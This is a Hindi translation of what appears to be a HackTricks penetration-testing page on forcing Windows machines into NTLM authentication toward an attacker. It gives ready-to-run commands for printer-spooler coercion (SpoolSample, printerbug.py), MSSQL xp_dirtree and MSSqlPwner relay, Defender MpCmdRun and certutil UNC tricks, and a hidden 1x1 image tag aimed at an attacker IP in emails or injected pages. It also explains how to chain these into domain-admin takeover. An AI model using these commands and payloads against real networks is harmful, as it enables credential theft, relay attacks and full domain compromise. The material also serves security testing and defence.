# NTLM विशेषाधिकार प्रमाणीकरण को मजबूर करना

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) एक **संग्रह** है **दूरस्थ प्रमाणीकरण ट्रिगर्स** का, जो C# में MIDL कंपाइलर का उपयोग करके कोडित किया गया है ताकि 3rd पार्टी निर्भरताओं से बचा जा सके।

## स्पूलर सेवा का दुरुपयोग

यदि _**प्रिंट स्पूलर**_ सेवा **सक्रिय** है, तो आप कुछ पहले से ज्ञात AD क्रेडेंशियल्स का उपयोग करके डोमेन कंट्रोलर के प्रिंट सर्वर से नए प्रिंट कार्यों पर **अपडेट** के लिए **अनुरोध** कर सकते हैं और बस इसे **किसी सिस्टम को सूचना भेजने** के लिए कह सकते हैं।\
ध्यान दें कि जब प्रिंटर किसी मनमाने सिस्टम को सूचना भेजता है, तो इसे उस **सिस्टम** के खिलाफ **प्रमाणित** होना आवश्यक है। इसलिए, एक हमलावर _**प्रिंट स्पूलर**_ सेवा को किसी मनमाने सिस्टम के खिलाफ प्रमाणित करवा सकता है, और सेवा इस प्रमाणीकरण में **कंप्यूटर खाता** का उपयोग करेगी।

### डोमेन पर Windows सर्वरों को खोजना

PowerShell का उपयोग करके, Windows बॉक्सों की एक सूची प्राप्त करें। सर्वर आमतौर पर प्राथमिकता होते हैं, इसलिए आइए वहीं ध्यान केंद्रित करें:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler सेवाओं को सुनने के लिए खोजना

थोड़ा संशोधित @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करते हुए, देखें कि क्या Spooler सेवा सुन रही है:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप Linux पर rpcdump.py का उपयोग कर सकते हैं और MS-RPRN प्रोटोकॉल की तलाश कर सकते हैं।
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### सेवा को किसी मनमाने होस्ट के खिलाफ प्रमाणीकरण के लिए कहें

आप [**SpoolSample को यहाँ से संकलित कर सकते हैं**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें यदि आप Linux पर हैं।
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation के साथ संयोजन

यदि एक हमलावर पहले से ही [Unconstrained Delegation](unconstrained-delegation.md) के साथ एक कंप्यूटर को समझौता कर चुका है, तो हमलावर **प्रिंटर को इस कंप्यूटर के खिलाफ प्रमाणित करवा सकता है**। अनियंत्रित प्रतिनिधित्व के कारण, **प्रिंटर के कंप्यूटर खाते का TGT** **अनियंत्रित प्रतिनिधित्व वाले कंप्यूटर की** **मेमोरी** में **सहेजा जाएगा**। चूंकि हमलावर पहले से ही इस होस्ट को समझौता कर चुका है, वह **इस टिकट को पुनः प्राप्त** कर सकेगा और इसका दुरुपयोग कर सकेगा ([Pass the Ticket](pass-the-ticket.md))।

## RCP बल प्रमाणन

{{#ref}}
https://github.com/p0dalirius/Coercer
{{#endref}}

## PrivExchange

`PrivExchange` हमला **Exchange Server `PushSubscription` फीचर** में पाए गए दोष का परिणाम है। यह फीचर किसी भी डोमेन उपयोगकर्ता को जो एक मेलबॉक्स रखता है, को HTTP के माध्यम से किसी भी क्लाइंट-प्रदानित होस्ट के खिलाफ Exchange सर्वर को प्रमाणित करने के लिए मजबूर करने की अनुमति देता है।

डिफ़ॉल्ट रूप से, **Exchange सेवा SYSTEM के रूप में चलती है** और इसे अत्यधिक विशेषाधिकार दिए जाते हैं (विशेष रूप से, इसके पास **डोमेन प्री-2019 क्यूमुलेटिव अपडेट पर WriteDacl विशेषाधिकार** हैं)। इस दोष का उपयोग **LDAP पर जानकारी को रिले करने और बाद में डोमेन NTDS डेटाबेस को निकालने** के लिए किया जा सकता है। उन मामलों में जहां LDAP पर रिले करना संभव नहीं है, इस दोष का उपयोग डोमेन के भीतर अन्य होस्ट पर रिले और प्रमाणित करने के लिए किया जा सकता है। इस हमले का सफलतापूर्वक शोषण करने से किसी भी प्रमाणित डोमेन उपयोगकर्ता खाते के साथ डोमेन एडमिन तक तात्कालिक पहुंच मिलती है।

## Windows के अंदर

यदि आप पहले से ही Windows मशीन के अंदर हैं, तो आप विशेषाधिकार प्राप्त खातों का उपयोग करके Windows को एक सर्वर से कनेक्ट करने के लिए मजबूर कर सकते हैं:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
या अन्य तकनीक का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM प्रमाणीकरण को मजबूर करने के लिए certutil.exe lolbin (Microsoft द्वारा हस्ताक्षरित बाइनरी) का उपयोग करना संभव है:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

यदि आप उस उपयोगकर्ता का **ईमेल पता** जानते हैं जो उस मशीन में लॉग इन करता है जिसे आप समझौता करना चाहते हैं, तो आप बस उसे एक **1x1 छवि** के साथ एक **ईमेल** भेज सकते हैं जैसे
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
और जब वह इसे खोलेगा, तो वह प्रमाणीकरण करने की कोशिश करेगा।

### MitM

यदि आप किसी कंप्यूटर पर MitM हमला कर सकते हैं और एक पृष्ठ में HTML इंजेक्ट कर सकते हैं जिसे वह देखेगा, तो आप पृष्ठ में निम्नलिखित की तरह एक छवि इंजेक्ट करने की कोशिश कर सकते हैं:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM प्रमाणीकरण को मजबूर करने और फ़िशिंग करने के अन्य तरीके

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 को क्रैक करना

यदि आप [NTLMv1 चुनौतियों को कैप्चर कर सकते हैं, तो उन्हें क्रैक करने के लिए यहां पढ़ें](../ntlm/index.html#ntlmv1-attack).\
_याद रखें कि NTLMv1 को क्रैक करने के लिए आपको Responder चुनौती को "1122334455667788" पर सेट करना होगा_

{{#include ../../banners/hacktricks-training.md}}
